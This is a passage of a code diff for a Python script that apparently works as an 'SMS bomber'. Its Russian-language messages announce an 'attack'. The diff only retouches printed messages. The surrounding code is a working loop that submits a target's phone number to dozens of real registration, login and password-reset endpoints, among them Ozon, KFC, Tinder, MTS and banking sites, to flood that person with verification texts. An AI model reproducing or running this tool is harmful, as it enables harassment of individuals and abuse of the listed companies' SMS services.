-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
@@ -5394,10 +5394,10 @@ if call == str(2):
             print('[+] tarantino-family отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://apteka.ru/_action/auth/getForm/',
@@ -5410,10 +5410,10 @@ if call == str(2):
             print('[+] Apteka отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://uklon.com.ua/api/v1/account/code/send',
@@ -5422,10 +5422,10 @@ if call == str(2):
             print('[+] Uklon отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
@@ -5434,10 +5434,10 @@ if call == str(2):
             print('[+] Ozon отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://requests.service.banki.ru/form/960/submit',
@@ -5447,10 +5447,10 @@ if call == str(2):
             print('[+] Banki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
@@ -5458,10 +5458,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.moyo.ua/identity/registration',
@@ -5470,10 +5470,10 @@ if call == str(2):
             print('[+] Moyo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
@@ -5481,10 +5481,10 @@ if call == str(2):
             print('[+] Helsi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[+] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
@@ -5493,10 +5493,10 @@ if call == str(2):
             print('[+] KinoLend отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -5506,10 +5506,10 @@ if call == str(2):
             print('[+] PizzaHut отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -5518,10 +5518,10 @@ if call == str(2):
             print('[+] Rabota отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -5532,7 +5532,7 @@ if call == str(2):
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
@@ -5540,10 +5540,10 @@ if call == str(2):
             print('[+] Citilink отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -5552,10 +5552,10 @@ if call == str(2):
             print('[+] Smsint отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -5564,10 +5564,10 @@ if call == str(2):
             print('[+] oyorooms отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -5577,10 +5577,10 @@ if call == str(2):
             print('[+] MVIDEO отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -5590,10 +5590,10 @@ if call == str(2):
             print('[+] newnext отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
@@ -5601,10 +5601,10 @@ if call == str(2):
             print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -5614,10 +5614,10 @@ if call == str(2):
             print('[+] alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
@@ -5625,10 +5625,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -5638,10 +5638,10 @@ if call == str(2):
             print('[+] Sberbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -5653,10 +5653,10 @@ if call == str(2):
             print('[+] Psbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
@@ -5664,10 +5664,10 @@ if call == str(2):
             print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
@@ -5675,10 +5675,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -5686,10 +5686,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
@@ -5697,10 +5697,10 @@ if call == str(2):
             print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -5709,10 +5709,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -5721,10 +5721,10 @@ if call == str(2):
             print('[+] Delitime отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -5733,10 +5733,10 @@ if call == str(2):
             print('[+] Guru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -5746,10 +5746,10 @@ if call == str(2):
             print('[+] ICQ отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -5759,10 +5759,10 @@ if call == str(2):
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -5771,10 +5771,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -5782,10 +5782,10 @@ if call == str(2):
             print('[+] Pmsm отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
@@ -5793,10 +5793,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
@@ -5804,10 +5804,10 @@ if call == str(2):
             print('[+] Lenta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -5816,10 +5816,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -5829,10 +5829,10 @@ if call == str(2):
             print('[+] MVideo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -5841,10 +5841,10 @@ if call == str(2):
             print('[+] OK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
@@ -5852,10 +5852,10 @@ if call == str(2):
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
@@ -5865,10 +5865,10 @@ if call == str(2):
             print('[+] Qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
@@ -5876,10 +5876,10 @@ if call == str(2):
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -5887,10 +5887,10 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -5901,10 +5901,10 @@ if call == str(2):
             print('[+] Twitch отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -5913,10 +5913,10 @@ if call == str(2):
             print('[+] CabWiFi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
@@ -5924,10 +5924,10 @@ if call == str(2):
             print('[+] wowworks отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
@@ -5936,10 +5936,10 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
@@ -5947,10 +5947,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -5960,10 +5960,10 @@ if call == str(2):
             print('[+] Alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
@@ -5971,10 +5971,10 @@ if call == str(2):
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
@@ -5982,10 +5982,10 @@ if call == str(2):
             print('[+] Delivery отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://requests.service.banki.ru/form/960/submit',
@@ -5995,17 +5995,17 @@ if call == str(2):
             print('[+] Banki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.moyo.ua/identity/registration',
@@ -6014,10 +6014,10 @@ if call == str(2):
             print('[+] Moyo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
@@ -6025,10 +6025,10 @@ if call == str(2):
             print('[+] Helsi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[+] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
@@ -6037,10 +6037,10 @@ if call == str(2):
             print('[+] KinoLend отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -6050,10 +6050,10 @@ if call == str(2):
             print('[+] PizzaHut отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
@@ -6061,10 +6061,10 @@ if call == str(2):
             print('[+] Rabota отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -6075,7 +6075,7 @@ if call == str(2):
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
@@ -6083,10 +6083,10 @@ if call == str(2):
             print('[+] Citilink отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -6095,10 +6095,10 @@ if call == str(2):
             print('[+] Smsint отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -6107,10 +6107,10 @@ if call == str(2):
             print('[+] oyorooms отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -6120,10 +6120,10 @@ if call == str(2):
